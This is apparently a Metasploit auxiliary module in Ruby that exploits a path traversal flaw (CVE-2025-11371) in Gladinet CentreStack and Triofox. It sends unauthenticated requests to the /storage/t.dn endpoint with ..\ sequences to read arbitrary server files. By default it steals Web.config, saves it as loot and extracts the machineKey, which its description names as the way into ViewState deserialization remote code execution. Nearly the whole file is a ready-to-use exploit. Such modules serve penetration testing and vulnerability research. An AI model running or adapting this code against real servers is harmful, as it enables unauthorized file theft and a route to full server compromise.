##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Gladinet
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gladinet CentreStack/Triofox Path Traversal',
        'Description' => %q{
          This module exploits a path traversal vulnerability (CVE-2025-11371) in
          Gladinet CentreStack and Triofox that allows an unauthenticated attacker to read
          arbitrary files from the server's file system.

          The vulnerability exists in the `/storage/t.dn` endpoint which does not properly
          sanitize the `s` parameter, allowing path traversal attacks. This can be used
          to read sensitive files such as Web.config which contains the machineKey used for
          ViewState deserialization attacks (CVE-2025-30406).

          Gladinet CentreStack versions up to 16.10.10408.56683 are vulnerable.
          Gladinet Triofox versions up to 16.10.10408.56683 are vulnerable.
        },
        'Author' => [
          'Huntress Team', # Vulnerability discovery
          'Valentin Lobstein <chocapikk[at]leakix.net>', # Metasploit module
          'Julien Voisin', # Review
          'jheysel-r7' # Review
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-11371'],
          ['URL', 'https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild']
        ],
        'DisclosureDate' => '2025-04-03',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        },
        'Actions' => [
          ['READ_FILE', { 'Description' => 'Read an arbitrary file from the target' }],
          ['EXTRACT_MACHINEKEY', { 'Description' => 'Read Web.config and extract the machineKey for RCE' }]
        ],
        'DefaultAction' => 'EXTRACT_MACHINEKEY'
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the Gladinet CentreStack or Triofox application', '/']),
      OptString.new('FILEPATH', [true, 'The file to read on the target', 'Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config']),
      OptString.new('DEPTH', [true, 'Path traversal depth (number of ..\\ sequences)', '..\\..\\..\\'])
    ])
  end

  def build_traversal_path(file_path)
    # Remove C:\ prefix if present (path traversal doesn't work with drive letters)
    normalized_path = file_path.gsub(/^[A-Z]:\\/, '').gsub(/^[A-Z]:/, '')
    "#{datastore['DEPTH']}#{normalized_path.gsub(' ', '+')}"
  end

  def send_traversal_request(file_path)
    traversal_path = build_traversal_path(file_path)

    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'storage', 't.dn'),
      'vars_get' => { 's' => traversal_path, 'sid' => '1' },
      'encode_params' => false
    })
  end

  def check
    version = gladinet_version
    return Exploit::CheckCode::Detected('Gladinet detected but version could not be determined') if version.nil?

    rex_version = Rex::Version.new(version)
    return Exploit::CheckCode::Vulnerable("Path traversal vulnerability confirmed (Build #{version})") if rex_version <= Rex::Version.new('16.10.10408.56683')

    Exploit::CheckCode::Detected("Version #{version} detected, attempting path traversal anyway")
  end

  def read_file(file_path)
    print_status("Attempting to read file via path traversal: #{file_path}")

    res = send_traversal_request(file_path)
    return nil unless res&.code == 200

    res.body
  end

  def run
    case action.name
    when 'READ_FILE'
      run_read_file
    when 'EXTRACT_MACHINEKEY'
      run_extract_machinekey
    end
  end

  def run_read_file
    file_content = read_file(datastore['FILEPATH'])
    return print_error('Failed to read file via path traversal') if file_content.nil? || file_content.empty?

    print_good("Successfully read file: #{datastore['FILEPATH']}")
    print_line
    print_line(file_content)
    print_line

    fname = File.basename(datastore['FILEPATH'])
    path = store_loot(
      'gladinet.file',
      'text/plain',
      datastore['RHOST'],
      file_content,
      fname,
      'File read from Gladinet via path traversal (CVE-2025-11371)'
    )
    print_good("File saved to: #{path}")
  end

  def run_extract_machinekey
    file_content = read_file(datastore['FILEPATH'])
    return print_error('Failed to read file via path traversal') if file_content.nil? || file_content.empty?

    print_good("Successfully read file: #{datastore['FILEPATH']}")
    print_line
    print_line(file_content)
    print_line

    fname = File.basename(datastore['FILEPATH'])
    path = store_loot(
      'gladinet.file',
      'text/plain',
      datastore['RHOST'],
      file_content,
      fname,
      'File read from Gladinet via path traversal (CVE-2025-11371)'
    )
    print_good("File saved to: #{path}")

    handle_machinekey_extraction(file_content, datastore['FILEPATH'], 'MachineKey extracted from Gladinet Web.config (CVE-2025-11371)')
  end
end
